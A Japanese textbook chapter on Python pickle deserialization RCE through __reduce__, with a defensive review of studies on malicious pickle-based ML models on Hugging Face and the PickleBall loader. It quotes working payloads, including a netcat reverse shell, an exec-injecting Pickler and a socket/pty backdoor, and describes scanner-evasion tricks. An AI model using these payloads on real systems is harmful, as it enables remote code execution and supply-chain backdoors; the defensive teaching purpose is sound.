# 第5章 Python/Ruby/Node.jsのデシリアライゼーション

## Python pickleの__reduce__によるRCE

### 導入: なぜpickleは「ただのシリアライズ」で済まないのか

Pythonの標準ライブラリ`pickle`は、Pythonのオブジェクト(リスト、辞書、クラスインスタンスなど)をバイト列に変換(シリアライズ/pickle化)し、そのバイト列から元のオブジェクトを復元(デシリアライズ/アンピクル化)する仕組みである。JSONやYAMLと違い、pickleは「クラスの型情報」や「インスタンスの内部状態」までそのまま保存できるため、機械学習モデル(scikit-learn、PyTorchの一部保存形式など)、キャッシュ、セッションデータ、分散タスクキュー(Celery)の引数受け渡しなど、Pythonエコシステムの広範囲で使われてきた。

しかし、pickleの公式ドキュメント自体が長年「信頼できないソースからのpickleデータを絶対にアンピクル化してはならない」と明記している。これは単なる建前ではなく、**pickleフォーマットは仕様上、デシリアライズ処理そのものが任意のPythonコードを実行できるように設計されている**ためである。JSONのパーサが「データを読む」だけなのに対し、pickleのアンピクル化は「プログラムを実行する」に近い。この章では、その核心である`__reduce__`メソッドを使った攻撃手法を、仕組みのレベルから理解する。

### pickleの内部動作: バイトコードを実行する仮想マシン

pickleフォーマットの正体を理解する鍵は、「pickle化されたデータは単なるシリアライズされた値の集合ではなく、**スタックベースの小さな仮想マシン(pickle machine, PVM)に対する命令列(オペコード)である**」という点だ。`pickle.loads()`を呼ぶと、内部的には`Unpickler`がバイト列を先頭から読み進め、各バイトを「オペコード」として解釈し、スタックに値をpushしたり、スタック上の値を組み合わせて新しいオブジェクトを構築したりする。

例えば単純な整数のpickleは次のようなオペコード列になる(`pickletools`モジュールで可視化できる)。

```python
import pickletools
pickletools.dis(pickle.dumps(42))
```

```
0: \x80 PROTO      4
2: K    BININT1    42
4: .    STOP
```

ここで重要なのは`GLOBAL`と`REDUCE`という2つのオペコードである。

- **GLOBAL**: 「モジュール名」と「属性名(クラス名や関数名)」の2つの文字列を読み取り、`__import__`相当の処理でその関数・クラスオブジェクトをスタックに積む。つまり**任意のインポート可能なモジュール内の任意の呼び出し可能オブジェクト(callable)を、pickleデータの中の文字列だけで指定してロードできる**。
- **REDUCE**: スタック上の「呼び出し可能オブジェクト」と「引数タプル」の2つをpopし、`callable(*args)`のように**その場で呼び出す**。この呼び出し結果がデシリアライズ後のオブジェクトになる。

この2つのオペコードが組み合わさることで、「任意の関数を、任意の引数で呼び出す」という処理が、pickleデータの解釈(パース)そのものの一部として実行される。攻撃者にとっての狙いは明快で、GLOBALで`os.system`のような危険な関数(sink、すなわち入力が最終的に実行・解釈される危険な代入先)を指定し、REDUCEでコマンド文字列を引数として渡せばよい。

### `__reduce__`メソッド: 攻撃者がこの機構を「合法的に」呼び出す入口

通常、Pythonの開発者が意図的にGLOBAL/REDUCEオペコードを埋め込むことはない。それを可能にするのが、pickle化の対象となるクラスが実装できる特殊メソッド`__reduce__`である。`__reduce__`はオブジェクトの「再構築方法」をpickleに教えるためのフック(処理を差し込む拡張点)で、本来は「複雑なオブジェクトをどう分解して保存し、どう組み立て直すか」をカスタマイズするために存在する。

`__reduce__`は次の形式のタプルを返す。

```python
(callable, args_tuple)
```

pickle化のとき、`pickle.dumps()`はこのクラスのインスタンスに対して`__reduce__()`を呼び出し、返ってきた`(callable, args_tuple)`を「GLOBAL callable」+「引数のpickle」+「REDUCE」というオペコード列に変換してバイト列に書き込む。そしてデシリアライズ時には、Unpicklerがこのオペコード列を素直に実行し、`callable(*args_tuple)`を呼び出す。

つまり攻撃者がやるべきことは、`__reduce__`が`(os.system, ("危険なコマンド",))`のようなタプルを返すクラスを定義し、そのインスタンスを一度pickle化してバイト列(ペイロード)を作ることだけである。このバイト列を被害者側のアプリケーションが`pickle.loads()`すれば、攻撃者が指定した任意のコマンドがその場で実行される。

David Hamannのブログでは、この攻撃クラスの典型例として次のようなコードが示されている。

```python
class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
               '/bin/sh -i 2>&1 | nc 127.0.0.1 1234 > /tmp/f')
        return os.system, (cmd,)
```

> 出典: David Hamann: Exploiting Python pickle — https://davidhamann.de/2020/04/05/exploiting-python-pickle/

このクラスをpickle化すると次の処理が起きる。

```python
payload = pickle.dumps(RCE())
```

生成された`payload`(バイト列)には、`os.system`をGLOBALで参照する命令と、`cmd`文字列を引数として渡してREDUCEする命令が埋め込まれる。攻撃者はこの`payload`を、Base64エンコードするなどして被害者に渡す。被害者アプリケーションがこれを受け取り、

```python
pickle.loads(payload)
```

を実行した瞬間、`RCE()`クラスのインスタンスが実際に構築されるより前に、その構築手順として指定された`os.system(cmd)`が呼ばれてしまう。ここで示されているコマンドは、`mkfifo`(名前付きパイプの作成)と`nc`(netcat)を組み合わせた古典的な**リバースシェル**(攻撃者のマシンへ接続し直し、対話的なシェルを取得する手法)の確立コードであり、成功すれば攻撃者は被害者のマシン上で任意のシェルコマンドを実行できる状態になる。

huntrのブログでも同様に、より単純化した例が示されている。

```python
class Malicious:
    def __reduce__(self):
        return (os.system, ("touch /tmp/poc",))

payload = pickle.dumps(Malicious())
with open("malicious.pkl", "wb") as f:
    f.write(payload)
```

そして被害者側が「無害なファイルだと思って」次のようにロードするだけで攻撃が成立する。

```python
with open("malicious.pkl", "rb") as f:
    pickle.load(f)  # この時点でコマンドが実行される
```

> 出典: Huntr: Pkl Rick'd — How Loading a Malicious Pickle Can Pwn Your Machine — https://blog.huntr.com/pickle-rickd-how-loading-a-malicious-pickle-can-pwn-your-machine

huntrの記事が強調している点は、この脆弱性は特定のライブラリのバグではなく「**pickleフォーマットの設計そのもの**」に起因するため、`.pkl`形式でモデルやオブジェクトを保存・共有する多くの機械学習フレームワーク(scikit-learn、PyTorchの一部の保存形式など)が構造的に同じリスクを抱えるという点である。この種の脆弱性は近年、**Model File Vulnerability(MFV)**、すなわち「モデルファイルの読み込みを通じた脆弱性」という分類でも語られるようになっており、「インターネットから拾ってきた学習済みモデルファイルを何気なくロードする」という、機械学習パイプラインで日常的に行われる操作そのものが攻撃経路になり得る点は2020年代の生成AI/MLブームの中で特に注意が必要である。

### なぜ「防御的にpickleを使う」ことが本質的に困難なのか

ここまでの仕組みから分かる通り、pickleの危険性は「実装のバグ」ではなく「フォーマットの仕様」に根ざしている。GLOBALオペコードは、pickleが「任意の複雑なオブジェクトを復元できる」という汎用性を実現するために、モジュールパスと属性名を自由に指定できる設計になっている。この汎用性そのものが、攻撃者にとっての「何を呼び出すか」の自由度になる。REDUCEオペコードも同様に、「オブジェクトの再構築ロジックを呼び出し可能オブジェクト+引数として表現する」という一般的な仕組みを実現するための必然的な機能であり、これが「任意の関数呼び出し」に転用される。

言い換えると、pickleを安全に使うために「危険な関数呼び出しだけを弾く」ような部分的な対策は原理的に難しい。`os.system`や`subprocess.Popen`を禁止しても、`eval`、`exec`、あるいは環境によっては`__import__`経由で任意のコードにたどり着ける別の呼び出し可能オブジェクトの組み合わせを攻撃者は探し続けられる(いわゆるガジェットチェーンの探索)。防御側が「危険リスト」を作るブラックリスト方式は、この種のシリアライゼーション脆弱性全般において常に迂回されるリスクを伴う。

### 防御策: 実務でとるべき対策

3つの資料に共通して挙げられている防御策を、実務上の優先順位とともに整理する。

**1. そもそも信頼できないデータをアンピクル化しない(最重要)**

PentesterLabの用語集ページも指摘する通り、根本的な対策は「攻撃者が内容を制御できるバイト列を`pickle.loads()`/`pickle.load()`に渡さない」ことに尽きる。ユーザー入力由来のCookie、キャッシュキー、アップロードされたファイルなどをpickleとして復元する設計そのものを見直すべきである。

> 出典: PentesterLab Glossary: Python Pickle — https://pentesterlab.com/glossary/python-pickle

**2. JSONなど安全なシリアライズ形式へ置き換える**

JSONやMessagePackのような「データ構造のみを表現し、任意のコード実行経路を持たないフォーマット」に置き換えることが、最も確実で長期的な解決策である。特にFlaskのセッションクッキーやDjangoのキャッシュバックエンドなど、pickleがデフォルトで使われがちな箇所は要注意で、これらのフレームワークでは署名付きJSONベースのシリアライザへの切り替えが可能な設定が用意されていることが多い。

**3. データ完全性の検証(HMAC署名)**

どうしてもpickleを使い続ける必要がある場合は、シリアライズ時にHMAC(鍵付きハッシュ)で署名し、デシリアライズ前にその署名を検証する方法がある。ただしこれは「攻撃者が秘密鍵を知らない限り、任意のpickleペイロードを作れない」ことを保証するものであり、鍵管理の失敗(鍵の漏えい、脆弱な鍵生成)があれば防御は無効化される点に注意する。あくまで「信頼できる送信元からのデータであることの確認」であって、pickle自体の危険性を消すものではない。

**4. 許可されたクラス/関数のみをロードできるように制限する**

`pickle.Unpickler`をサブクラス化し、`find_class`メソッドをオーバーライドして、GLOBALオペコードが参照できるモジュール・クラスをホワイトリスト方式で厳格に制限する`RestrictedUnpickler`パターンがある。

```python
import pickle
import io

class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        # 許可するモジュール・クラスのみをホワイトリストで限定する
        ALLOWED = {
            ("mypackage.models", "SafeData"),
        }
        if (module, name) in ALLOWED:
            return getattr(__import__(module, fromlist=[name]), name)
        raise pickle.UnpicklingError(
            f"'{module}.{name}' のロードは許可されていません"
        )

def restricted_loads(data: bytes):
    return RestrictedUnpickler(io.BytesIO(data)).load()
```

`find_class`はGLOBALオペコードが解決される際に必ず経由する箇所であるため、ここで許可リストにない`(module, name)`の組み合わせを拒否すれば、`os.system`のような危険な関数への到達を防げる。ただし、このアプローチは「許可したクラス自身が持つ別の`__reduce__`実装や、コンストラクタの副作用」まで検証するものではないため、許可リストに載せるクラスの安全性を個別に精査する運用負荷が発生する点、また将来的に許可リストへ追加するクラスの選定を誤ると再びガジェットとして悪用され得る点には留意が必要である。あくまで多層防御の一部と位置づけ、第一の対策(信頼できないデータをそもそも扱わない)を優先すべきである。

**5. ファイルシステム権限・ネットワーク到達性の制限**

万一デシリアライズ処理が突破された場合の被害を限定するため、pickleを扱うプロセスの実行ユーザー権限を最小化し、外部ネットワークへの不要な到達性(前述のリバースシェルの接続先など)をファイアウォールで制限しておくことも、多層防御として有効である。

### まとめ

Python pickleの`__reduce__`を悪用したRCEは、「デシリアライズ処理がGLOBALオペコードで任意の呼び出し可能オブジェクトを解決し、REDUCEオペコードでそれを引数付きでその場実行する」というpickleフォーマットの設計そのものに起因する。攻撃者は`__reduce__`メソッドをオーバーライドしたクラスを用意し、`(危険な関数, 引数タプル)`を返させるだけで、`pickle.loads()`/`pickle.load()`を呼んだ瞬間にコードを実行させられる。この性質はscikit-learnやPyTorchの一部形式など`.pkl`拡張子でモデルを配布・共有する機械学習分野で特に実害に直結しやすく、Model File Vulnerability(MFV)という文脈でも近年注目されている。防御の要諦は、信頼できないpickleデータを絶対にロードしないという原則を第一に置き、JSON等の安全な形式への移行、HMACによる完全性検証、`find_class`のホワイトリスト制限を多層的に組み合わせることである。

## MLモデルファイルのpickle悪用（AIサプライチェーン研究）

第5章の前半で、Python の `pickle` がなぜデシリアライズ時に任意コードを実行できるのか（`__reduce__` と `REDUCE` オペコード）を学んだ。本節では、その古典的な問題が **AI/ML のサプライチェーン**という現代的な文脈でどれほど深刻な現実問題になっているかを、2つの学術研究に沿って掘り下げる。

ML の世界では、学習済みモデル（重みやアーキテクチャ）をファイルとして配布・再利用するのが当たり前になった。その配布ハブが Hugging Face である。しかし PyTorch の `torch.save` をはじめ、ML モデルの保存形式の多くは内部で pickle を使っている。つまり**「モデルをダウンロードして読み込む」という何気ない一行 `torch.load(...)` が、信頼できない相手が仕込んだ Python コードの実行になりうる**。これは「AI サプライチェーン攻撃（AI supply chain attack）」の中核をなす攻撃面であり、防御側（モデルを利用する開発者・MLOps 運用者）が理解すべき最重要トピックだ。

本節では次の2本の研究を扱う。

1. Casey, Santos & Mirakhorli, *A Large-Scale Exploit Instrumentation Study of AI/ML Supply Chain Attacks in Hugging Face Models*（arXiv:2410.04490）— **どれほど蔓延しているか**の大規模実測。
2. Kellas et al., *PickleBall: Secure Deserialization of Pickle-based Machine Learning Models*（arXiv:2508.15987）— **どう安全に読み込むか**の防御手法研究。

> ⚠️ **注記**: 本節は防御目的の解説である。攻撃コードは「なぜ危険か」を理解するための最小限の原理説明にとどめ、実在サービスや本番環境への無許可の検証手順は一切書かない。学習済みモデルは常に「未検証の実行可能ファイル」として扱う、という防御的な心構えを身につけるのが目的だ。

---

### 前提知識の確認：なぜ ML モデルファイルでコード実行が起きるのか

まず仕組みを再確認する。pickle は**スタックベースの仮想マシン（Pickle Machine, PM）**で、バイナリ列に埋め込まれた**オペコード（opcode: PM が1つずつ解釈する命令コード）**を順に実行してオブジェクトを復元する。PM のオペコードには2種類あり、ここが危険の源泉である。

- **ネイティブ型を作る命令**：`NEWFALSE`（bool を作る）など。無害。
- **Python の callable（関数やクラス）を輸入・呼び出す命令**：
  - `GLOBAL` / `STACK_GLOBAL` … callable の名前（例: `os.system`）を受け取り、それを**import してスタックに積む**（＝importing opcode）。
  - `NEWOBJ` … クラスの `__new__` を呼んでインスタンスを確保する（allocating opcode）。
  - `REDUCE` … スタックから「関数」と「引数」を取り出して**関数を呼ぶ**（invoking opcode）。戻り値をスタックに積む。
  - `BUILD` … オブジェクトの属性を設定・変更する（building opcode）。

攻撃者から見れば、`GLOBAL` で `os.system` を import し、`REDUCE` で `("ls",)` を引数に呼ぶ、というオペコード列を書くだけで任意コマンドが走る。この一連の流れを開発者側から生み出す正規の仕組みが `__reduce__` メソッドである。オブジェクトを pickle 化するとき、Python は `__reduce__` を呼び、その戻り値 `(関数, 引数)` をオペコードとして書き出す。デシリアライズ時にはその関数が引数付きで呼ばれる——**これが「任意関数を呼ぶプリミティブ」そのもの**だ。

PickleBall 論文は、ML ライブラリが実際にこの仕組みを正規用途で使っている例を示している。

```python
import pickle

def read_weights_to_tensor(filename: str) -> Tensor:
    # 重みファイルを読んで Tensor を返す正規の関数
    ...

class Tensor(object):
    ...
    def __reduce__(self):
        # デシリアライズ時に read_weights_to_tensor(self.filename) を呼ばせる
        return (read_weights_to_tensor, (self.filename,))

class Model(object):
    def __init__(self, weights: library.Tensor):
        self.weights = weights
    @classmethod
    def load(cls, path):
        with open(path, 'rb') as fd:
            return pickle.load(fd)   # ← ここが sink（入力が最終的に実行される危険な地点）
```

> 出典: PickleBall: Secure Deserialization of Pickle-based Machine Learning Models — https://arxiv.org/abs/2508.15987

**ポイントは「正規の `__reduce__`」と「悪意ある `__reduce__`」を pickle のレベルで区別できない**ことだ。`read_weights_to_tensor` を呼ぶのも `os.system` を呼ぶのも、PM にとっては同じ「`GLOBAL` + `REDUCE`」でしかない。だからこそ、pickle をそのまま読み込む限り、モデルファイルは**署名なしの実行可能ファイル**に等しい。

安全な代替として Hugging Face が2022年9月に公開した **SafeTensors** 形式がある。これはテンソル（重みの数値配列）だけをエンコードし、callable を呼ぶオペコードを一切持たない。表現力を意図的に絞ることで安全性を得ているが、その代償としてモデルの**アーキテクチャや学習状態、カスタムオブジェクト**は保存できない。この「安全 vs 表現力」のトレードオフが、後述する pickle が消えない根本原因になる。

---

### 研究1：Hugging Face 上の大規模実測 — 「59% が危険形式、14件が実際に悪意モデル」

Casey らの研究（arXiv:2410.04490, ノートルダム大／ハワイ大, 2024）は、**「AI モデルハブにおける安全でないシリアライズがどれほど蔓延し、実際に悪用可能か」を初めて大規模に実測**した論文である。

> ⚠️ **未取得の資料**: 本論文の PDF（https://arxiv.org/pdf/2410.04490 ）は自動テキスト抽出で一度失敗したが、ローカル保存された PDF から本文全文を抽出でき、以下は**原典本文からの直接引用に基づく**（数値・コードとも原典どおり）。原本は上記 URL からも直接ご覧いただける。

#### 研究設問（RQ）と方法

論文は4つの研究設問を立てた。

- **RQ1**: Hugging Face で最も使われているシリアライズ形式は？
- **RQ2**: そのうちどれだけが実際に悪用（exploit）可能か？
- **RQ3**: Hugging Face 純正のセキュリティスキャナはどこまで検知できるか？
- **RQ4**: 意図的に悪意あるモデルは実在するか、何件あるか？

対象は Hugging Face の **4,023 リポジトリ、計 22,834 個のモデルファイル**。形式判定は拡張子とファイルのマジックバイト／内部文字列で行った（例: ファイル内に `dill._dill\x94\x8c` があれば Dill、`joblib.` があれば JobLib、それ以外の pickle 系は Pickle と判定）。

論文が整理した「安全でない」シリアライズ形式の一覧が重要だ。**Dill・JobLib・`torch.save`（PyTorch）はすべて内部で pickle を使う**ため危険、ONNX（protobuf ベース）や H5/HDF5（Keras）も別経路で危険、安全なのは **SafeTensors のみ**という位置づけである。

#### RQ1 の結果：59% が安全でない形式

> 22,834 ファイルのうち安全な形式（SafeTensors）は 9,368 件だけで、**13,466 件（59%）が安全でないシリアライズ形式**を使っていた。

内訳（安全でない形式の分布）は次のとおり。

| 形式 | ファイル数 |
|---|---|
| PyTorch（`torch.save`, pickle ベース） | 8,058 |
| NumPy | 2,357 |
| ONNX | 1,919 |
| H5/HDF5 | 581 |
| Pickle（素） | 539 |
| Joblib | 7 |
| TorchScript | 5 |

**なぜ PyTorch が圧倒的多数なのか**：`torch.save` は PyTorch の標準保存 API で、内部で pickle を使う。PyTorch は使いやすさ・柔軟性から ML で最も普及しているため、その標準機能がそのまま最大の攻撃面になっている。SafeTensors への移行は進みつつあるものの、依然として過半数が危険形式のままだ、というのが RQ1 の結論である。

#### RQ2 の結果：96% が実際に悪用可能

論文は「実測」を名乗るだけあり、実際に悪用可能かを**攻撃計装（exploit instrumentation）**で検証した。手法の核心は「悪意ある Pickler を自作し、正規モデルを再シリアライズする際にペイロードを先頭に注入する」ことである。原典 Listing 1 の中核を防御理解のために引用する（`exploit.txt` に `HACKED` と書くだけの無害ペイロードで検証している点に注目）。

```python
class Payload:
    def __reduce__(self):
        cmd = ("with open('{save_path}', 'w') as f:"
               " f.write('HACKED')")
        return (exec, (cmd,))   # デシリアライズ時に exec(cmd) が走る

class MaliciousPickler(pickle._Pickler):
    def dump(self, obj):
        # プロトコルヘッダを書いたあと…
        self.save(Payload())   # ← ペイロードを「先頭」に注入
        self.save(obj)         # 続いて本来のモデルを保存
        self.write(pickle.STOP)
```

**なぜ先頭に注入するのか**：pickle はオペコードを**順に**実行し `STOP` で止まる。ペイロードを先頭に置けば、モデル本体が復元される前に `Payload.__reduce__` が生成した `exec(cmd)` が実行される。`torch.save` の場合は `pickle_module` パラメータにこの `MaliciousPickler` を渡すだけで、PyTorch モデルにも同じ注入ができる——これが「正規 API がそのまま攻撃に使える」ことの実証だ。

結果：悪用手法が対応する 10,528 ファイル（Pickle・JobLib・Dill・PyTorch・ONNX）のうち **10,096 件（96%）を実際に悪用できた**。失敗の主因は「必要な外部ライブラリ（例: `accelerate`）が未インストールでモデル自体を読み込めなかった」ケースで、pickle の仕組み上の防御が効いたわけではない。

なお ONNX・TorchScript は経路が異なる。ONNX は**モデルのメタデータに `action` キーを仕込み、読み込み側が `exec()` する**方式（`__reduce__` は使わない、やや露骨な手口）。TorchScript は `torch.jit.save` の `_extra_files` パラメータにメタデータを同梱する方式。H5/HDF5（Keras）は **Lambda レイヤ**（任意の関数をレイヤとして包む機能）にペイロードを埋める。Keras 2.13 以降は Lambda 関数の定義を読み込み側ファイルに要求するようになったが、攻撃者は「モデルを読み込むスクリプトごと配布し、その中に悪意ある lambda を書く」ことで回避できる、と論文は指摘する。

#### RQ3 の結果：純正スキャナは 62% を見逃す

Hugging Face には pickle をスキャンして危険な import（`exec` や `eval` など）を警告する機能がある（重大度に応じて赤・橙・灰でフラグ表示）。しかし——

> 13,466 件の危険形式ファイルのうち、スキャナがフラグを立てたのは **5,137 件（38%）のみ**。**8,329 件（62%）は見逃された**。

見逃しの根本原因は明快だ。このスキャナは**「pickle 系形式」しか対象にしていない**。NumPy（2,357 件見逃し）・ONNX（1,919 件見逃し）・H5/HDF5（581 件見逃し）といった非 pickle の危険形式は、そもそもスキャン対象外なのである。しかも pickle 対象でも「既知の危険 import を探す**デニーリスト（拒否リスト）**方式」なので、リストにない callable を使われれば素通りする。

#### RQ4 の結果：実在した 14 件の悪意モデル

最も注目すべき結果だ。論文は `sys.settrace`（Python の呼び出しトレース）と `strace`（システムコールトレース）を組み合わせた**動的トレーサ**を作り、モデル読み込み時に実際に何が呼ばれるかを観測した。

> 12,973 ファイルを解析し、トレーサが 86 件をフラグ。精査の結果、**14 件が本物の悪意あるモデル**だった。うち **9 件（64%）が外部ソケットに接続**（＝リバースシェル／バックドア）、3 件がブラウザを開いてメッセージを表示し `sys.modules` から痕跡を消去、1 件が `ls`、1 件が `echo 'pwnd!'`。

9 件のソケット接続モデルはホスト・ポートこそ違えど**中身は同一のリバースシェルコード**だった。原典 Listing 2 の中核（防御理解のため。これは攻撃者が実際に Hugging Face 上に置いていたバックドアの構造だ）：

```python
def a():
    import socket, pty, os
    s = socket.socket()
    s.connect((RHOST, RPORT))                 # 攻撃者サーバへ接続
    [os.dup2(s.fileno(), fd) for fd in (0,1,2)]  # 標準入出力をソケットに差し替え
    pty.spawn("/bin/sh")                      # シェルを起動 = リバースシェル成立
threading.Thread(target=a).start()
```

**なぜ動的トレーサが必要だったか**：静的なデニーリスト（Hugging Face 純正スキャナ）は、あるモデルを「`builtins.exec` を使用」とフラグしただけで、それがバックドアを張る危険な挙動だとは伝えられなかった。何が import されるかではなく**何が実際に呼ばれ、どんなシステムコールが飛ぶか**を見て初めて、リバースシェルという本質が見える。一方でトレーサにも 72 件の偽陽性があった（ソケットを `bind` して即 `close` するだけのモデル。バインド先が `::1`＝ループバックなので TCP/IP スタックのテスト用と判断できる）。

コメントに「`# just to be extra sneaky, let's clean up...`（さらにこっそりやるため、痕跡を消そう）」と書かれたモデルもあり、攻撃者が**検知回避（難読化）を試行錯誤している**様子が観測された点も示唆的だ。

#### 研究1 の防御的示唆

- **SafeTensors が第一選択**だが、テンソル以外（アーキテクチャ・学習状態・カスタムオブジェクト）を保存できず、後方互換のために `torch.save` が使われ続けるという技術的制約がある。だから「SafeTensors を使え」だけでは解決しない。
- **ハブ純正スキャナを過信しない**。pickle 系しか見ず、デニーリスト方式で 62% を見逃す。ダウンロードしたモデルは**サンドボックス／隔離環境で読み込む**、可能なら重みだけを SafeTensors に変換してから使う、といった多層防御が要る。

> 出典: A Large-Scale Exploit Instrumentation Study of AI/ML Supply Chain Attacks in Hugging Face Models — https://arxiv.org/abs/2410.04490 / https://arxiv.org/pdf/2410.04490

---

### 研究2：PickleBall — 「安全かつ使える」pickle 読み込みへ

研究1が「問題の広さ」を測ったのに対し、Kellas ら（Columbia／Brown／Purdue／Google／Technion, arXiv:2508.15987, v2 2025年9月）の **PickleBall** は「では**どうやって pickle モデルを安全に読み込むか**」に踏み込む。既存防御の限界を分析したうえで、新しい防御機構を提案・実装・評価した論文である。

#### なぜ既存防御では不十分なのか

PickleBall はまず、既存の2系統の防御が抱える欠陥を実測で示す。

**(A) モデルスキャナ（picklescan, ProtectAI/ModelScan）** — デニーリスト方式。危険な callable の一覧に該当すれば警告する。しかしデニーリストは本質的に**網羅できず、回避される**。論文は実際に、スキャナが見逃す callable を使うモデルと、許可された callable を**間接的に呼ぶ**モデルの2種を作り、ModelScan と別スキャナを回避してみせた（Appendix B）。評価では ModelScan は 84 件の悪意モデルのうち **9 件を良性と誤判定（偽陰性）**。誤判定の内訳は、(1) デニーリストにない callable でペイロードを実装（5件）、(2) `numpy.load()` 等で追加ペイロードを動的に読み込みスキャナが静的に追えない（3件）、(3) **複数の `STOP` オペコード**を使い、最初の `STOP` でスキャナが解析を打ち切って残りを見逃す（1件）——といずれも「不完全なデニーリスト」の限界を突いている。

**(B) 制限付きローダ：PyTorch weights-only unpickler** — こちらは逆に**アローリスト（許可リスト）方式**。PyTorch 1.13（2022年11月）で導入され、**PyTorch 2.6（2024年11月）から `torch.load` のデフォルト**になった。安全な PyTorch API の小さな許可集合に属する callable しか呼べないようにする。悪意モデルはすべてブロックできる（偽陰性ゼロ）が、**許可集合が PyTorch 標準向けに固定**されているため、それ以外の callable を使う正規モデルが読めない。

PickleBall はこの usability 問題を実測した。人気 pickle-only リポジトリ 1,426 件を `fickling`（pickle を静的にトレースするツール）で調べたところ——

> **219 件（15.4%）が、weights-only unpickler では読み込めない**（許可外の callable を含む）モデルを1つ以上抱えていた。この 219 件は調査最終月だけで**合計 7,960 万回ダウンロード**されており、36 種の許可外 callable（numpy や Transformers 由来が多い）が現れた。

具体例が `flair/ner-english-fast`（英語固有表現抽出、100万 DL 超の**良性**モデル）だ。flair ライブラリは weights-only unpickler の許可集合に無い callable を使うため、**ライブラリ側が weights-only を明示的に無効化**している。結果、利用者は弱いスキャナと自分の目視判断に頼るしかなく、実際 Hugging Face のスキャナは（良性なのに）「一部の import が疑わしい」と警告を出す。**「安全にしようとすると読めない、読もうとすると危険」**というジレンマそのものだ。

#### PickleBall のアイデア：ライブラリのソースから「あるべき挙動」を静的に導く

PickleBall の核心的な発想は次のとおり。

> 良性なモデルが読み込み時にどんな callable を呼ぶかは、**そのモデルを作った ML ライブラリのソースコードに書いてある**。ならば、ライブラリを静的解析して「このライブラリのモデルを復元するときに正当に現れうる callable の集合」を**自動生成したポリシー（許可リスト）**として抽出し、読み込み時にそれだけを許可すればよい。

これは weights-only の固定アローリストと違い、**ライブラリごとに最適化された許可リスト**を作る点が新しい。動作は2フェーズ。

**フェーズ1：ポリシー生成（オフライン、一度きり）**

対象 ML ライブラリと、読み込むモデルのクラス定義を入力に、**AST（抽象構文木）**上で静的解析（実装は Joern フレームワーク＋独自の Scala コード約1,300行）を行い、次の2つの集合からなるポリシーを出力する。

- **Allowed Imports（許可 import）**: 生成されうるオブジェクトの型。
- **Allowed Invocations（許可呼び出し）**: 正当に呼ばれうる関数。

アルゴリズム（Algorithm 1）は、対象クラスに `__reduce__` があれば**その戻り値の型・関数を許可集合に加え**、戻り値の型をさらに解析対象に追加して再帰的にたどる（`GetReduceReturnTypes` / `GetReduceReturn`）。つまり「このクラスを pickle 化したら、どんな `(関数, 引数)` が書き出され、復元時に何が呼ばれるか」をソースから推論するわけだ。冒頭の `Tensor.__reduce__` の例なら、`read_weights_to_tensor` が Allowed Invocations に、`Tensor` が Allowed Imports に入る——`os.system` は当然入らない。

**フェーズ2：ポリシー適用（読み込み時、pickle の drop-in 置き換え）**

生成ポリシーを PM に適用する。標準 `pickle` モジュールの差し替えとして動く。

- importing opcode（`GLOBAL` 等）は Allowed Imports にある callable しか触れない。
- allocating opcode は許可された型の `__new__` しか呼べない。
- invoking opcode（`REDUCE` 等）は**除去されるか、Allowed Invocations に限定**される。

巧妙な防御が2点ある。第一に、**「import は許可されているが invocation は許可されていない callable」を、`BUILD` オペコードで `__name__`／`__module__` を書き換えて別の許可 callable に「なりすます」攻撃**を想定し、building opcode によるこれらの属性変更を禁止している。第二に、静的解析は Python の動的な性質（実行時の属性書き換え・動的型付け）ゆえに完璧にはなれない（＝ポリシーが不完全＝正当な callable を取りこぼしうる）。この副作用を吸収するのが**遅延適用（lazy enforcement）**だ。

> 許可外の import に出会ったら**即座に例外を投げず、スタブオブジェクト（何もしないダミー。呼ばれる／アクセスされると初めて例外を投げる）**を代わりに作る。そのスタブが最後まで使われなければ読み込みは成功し、実際に呼ばれたときだけ違反として弾く。

**なぜ遅延適用が効くのか**：モデルには「初期化時に属性として持つが、その後のロード・推論では一切使わないメタデータ」が多い。取りこぼした callable がそういう死蔵メタデータなら、スタブのまま無害に読み込みが完了する。一方で、攻撃者が「返り値オブジェクトのメソッドを許可外 callable で上書きし、後で呼ばせる」手口を使っても、スタブが**アクセス時に例外を投げる**ので防げる。

#### 評価結果

論文は **336 モデルのデータセット**（Hugging Face 収集の良性 252 件＋実在・合成の悪意 84 件）で評価した。

- **悪意モデルのブロック（RQ1）**: 生成された全ポリシーで、**84 件すべて（100%）の悪意モデルのペイロード実行を阻止**。理由は単純で、生成ポリシーには `eval()` や `system()` のような危険 callable が最初から含まれないため、読み込み時に例外が出る。
- **良性モデルの読み込み（RQ2）**: **79.8% の良性モデルを正しく読み込み・推論**できた（16 の人気ライブラリ——flair, YOLOv5/v11, sentence_transformers, PyAnnote など——で検証）。失敗要因は静的解析の限界に起因し、(a) 初期化後に動的にセットされる属性の型を取りこぼす、(b) 推論中に**追加の pickle 読み込み**が発生（MeloTTS 2件）、(c) ライブラリのバージョンドリフト（後方互換用の未使用スタブクラス）、(d) 名前空間の不整合（`yolov5.models.common.Conv` vs `models.common.Conv`）——など。lazy enforcement で読み込めた「スタブ入りモデル」も、より厳密なデータセット（NER、AISHELL-4 音声、COCO 画像等）で追試したところ、**通常の PM と同一の推論結果**を返し、スタブへのアクセスによる違反は起きなかった。
- **性能（RQ3）**: ポリシー生成はオフラインの一度きりコスト。読み込み時のオーバーヘッドも実用的な範囲。
- **既存手法との比較（RQ4）**: 下表が要点。

| 手法 | 方式 | 悪意モデルの偽陰性 | 良性モデルの誤ブロック |
|---|---|---|---|
| ModelScan | 静的デニーリスト | 9 件見逃し（10.7%） | 0 |
| ModelTracer | 動的デニーリスト | 40 件見逃し（47.6%） | 0 |
| weights-only unpickler | 固定アローリスト | 0 | **95 件**（37.7%） |
| **PickleBall** | 生成アローリスト | **0** | **51 件**（20.2%） |

読み方：スキャナ（ModelScan/ModelTracer）は良性を弾かない代わりに**悪意を取りこぼす**（デニーリストの宿命）。weights-only と PickleBall はどちらも**悪意を100%阻止**するが、良性の読み込みで差が出る——weights-only は 95 件も誤ブロックするのに対し PickleBall は 51 件で、**PickleBall の方が多くの良性モデルを読める**。要約すると論文の主張は「**state-of-the-art（weights-only）より 22% 多くの良性モデルを読み込みつつ、悪意モデルは 100% ブロックする**」だ。

#### 残る攻撃面と限界（防御の心構え）

